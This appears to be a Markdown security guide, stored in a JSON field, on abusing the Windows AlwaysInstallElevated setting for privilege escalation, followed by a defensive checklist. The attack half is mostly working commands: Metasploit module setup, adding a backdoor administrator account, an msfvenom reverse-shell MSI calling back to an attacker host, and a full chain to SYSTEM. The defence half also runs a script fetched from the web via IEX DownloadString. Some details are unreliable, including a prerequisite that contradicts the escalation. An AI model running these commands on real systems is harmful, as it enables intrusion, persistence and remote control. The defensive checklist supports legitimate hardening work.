        "content": "# AlwaysInstallElevated Exploit Analysis\n\n## **Core Concept**\n- **AlwaysInstallElevated** is a Windows privilege escalation vulnerability\n- Two registry keys allow regular users to install MSI packages with SYSTEM privileges\n- **HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated**\n- **HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated**\n\n## **Prerequisites**\n- ✔ Meterpreter session already established on target\n- ✔ Both AlwaysInstallElevated registry keys set to \"1\"\n- ✔ Target user must have local administrative rights (for HKLM key)\n\n## **Exploitation Steps**\n\n### **Step 1: Verify Vulnerability**\n```bash\n# Check registry keys from Meterpreter\nmeterpreter > reg queryval -k HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer -v AlwaysInstallElevated\nmeterpreter > reg queryval -k HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer -v AlwaysInstallElevated\n```\n- Both must return \"1\" for exploit to work\n\n### **Step 2: Load and Configure Module**\n```bash\nmsf6 > use exploit/windows/local/always_install_elevated\nmsf6 exploit(windows/local/always_install_elevated) > set VERBOSE true\nmsf6 exploit(windows/local/always_install_elevated) > set SESSION [ID]\n```\n\n### **Step 3: Choose Execution Method**\n\n**Option A: Execute Command Directly**\n```bash\nset payload windows/exec\nset CMD \"net user hacker Password123! /add\"\nset CMD \"net localgroup administrators hacker /add\"\nrun\n```\n\n**Option B: Upload and Execute Binary**\n```bash\n# First upload your malicious exe\nupload /path/to/backdoor.exe C:\\\\Windows\\\\Temp\\\\evil.exe\n\n# Then run via MSI\nset CMD \"C:\\\\Windows\\\\Temp\\\\evil.exe\"\nrun\n```\n\n**Option C: PowerShell Encoded Command**\n```bash\n# Create encoded PowerShell command\n$command = \"whoami > C:\\whoami.txt\"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\n# Result: dwBoAG8AYQBtAGkAIAA+ACAAQwA6AFwAdwBoAG8AYQBtAGkALgB0AHgAdAA=\n\nset CMD \"powershell -enc dwBoAG8AYQBtAGkAIAA+ACAAQwA6AFwAdwBoAG8AYQBtAGkALgB0AHgAdAA=\"\nrun\n```\n\n### **Option D: MSI Payload via msfvenom**\n```bash\n# Create malicious MSI\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n         LHOST=192.168.1.100 \\\n         LPORT=443 \\\n         -e x64/xor_dynamic \\\n         -i 3 \\\n         -f msi \\\n         -o malicious.msi\n\n# Host it\npython3 -m http.server 80\n\n# Execute from target (manual or via exploit)\nmsiexec /quiet /i http://192.168.1.100/malicious.msi\n```\n\n## **Live Example: Full Chain**\n```bash\n# 1. Get initial foothold\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nexploit\n\n# 2. Check for AlwaysInstallElevated\nmeterpreter > shell\nreg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" /v AlwaysInstallElevated\nreg query \"HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" /v AlwaysInstallElevated\n\n# 3. Escalate privileges\nbackground\nuse exploit/windows/local/always_install_elevated\nset SESSION 1\nset CMD \"powershell -enc [ENCODED_PAYLOAD]\"\nrun\n\n# 4. Verify escalation\nsessions -i 2\nmeterpreter > getuid\n# Should show: NT AUTHORITY\\SYSTEM\n```\n\n## **Security Checklist for Defense**\n\n### **Prevention**\n- [ ] **Disable AlwaysInstallElevated** in Group Policy\n  - Computer Configuration → Administrative Templates → Windows Components → Windows Installer\n  - User Configuration → Administrative Templates → Windows Components → Windows Installer\n- [ ] **Regularly audit registry keys**:\n  ```powershell\n  Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -ErrorAction SilentlyContinue\n  Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -ErrorAction SilentlyContinue\n  ```\n- [ ] **Implement Least Privilege Principle**\n  - Don't grant local admin rights unnecessarily\n  - Use separate admin accounts for administrative tasks\n\n### **Detection**\n- [ ] **Monitor MSI executions**:\n  ```powershell\n  # Windows Event Log IDs to monitor\n  # 1040: MSIInstaller Information\n  # 11707, 11724: Application installation\n  ```\n- [ ] **Set up SIEM alerts** for:\n  - MSI packages installed from Temp directories\n  - MSIexec with /quiet or /qn flags\n  - Multiple MSI installations from same user in short time\n\n### **Hardening**\n- [ ] **Configure AppLocker/Windows Defender Application Control**:\n  ```xml\n  <!-- Sample AppLocker rule to block MSI from Temp -->\n  <RuleCollection Type=\"Msi\" EnforcementMode=\"Enabled\">\n    <FilePathRule Id=\"...\" Name=\"Block MSI from Temp\" Description=\"\" UserOrGroupSid=\"S-1-1-0\" Action=\"Deny\">\n      <Conditions>\n        <FilePathCondition Path=\"%TEMP%\\*.msi\"/>\n      </Conditions>\n    </FilePathRule>\n  </RuleCollection>\n  ```\n- [ ] **Enable Attack Surface Reduction Rules**:\n  ```powershell\n  # Block Office applications from creating child processes\n  Set-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled\n  ```\n- [ ] **Regular vulnerability assessments**:\n  ```bash\n  # Use PowerUp.ps1 for privilege escalation checks\n  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')\n  Invoke-AllChecks\n  ```\n\n### **Incident Response**\n- [ ] **If exploited**:\n  1. Immediately isolate the affected system\n  2. Check for persistence mechanisms added\n  3. Review MSI installation logs at `C:\\Windows\\Logs\\MSI*.log`\n  4. Scan for newly created user accounts\n  5. Reset compromised credentials\n\n## **Key Points to Remember**\n- AlwaysInstallElevated requires **both** HKLM and HKCU registry keys enabled\n- Works even if UAC is enabled (bypasses UAC)\n- Leaves traces in Windows Installer logs\n- Can be detected by monitoring msiexec.exe process creation\n- Modern EDR solutions often flag this technique\n\n## **Mitigation Command**\n```powershell\n# Remediation commands (run as admin)\nRemove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -Force\nRemove-ItemProperty -Path \"HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -Force\n```\n\nThis exploit demonstrates why proper configuration management and continuous monitoring are essential for Windows security. Regular audits of Group Policy and registry settings can prevent such privilege escalation paths from being available to attackers."
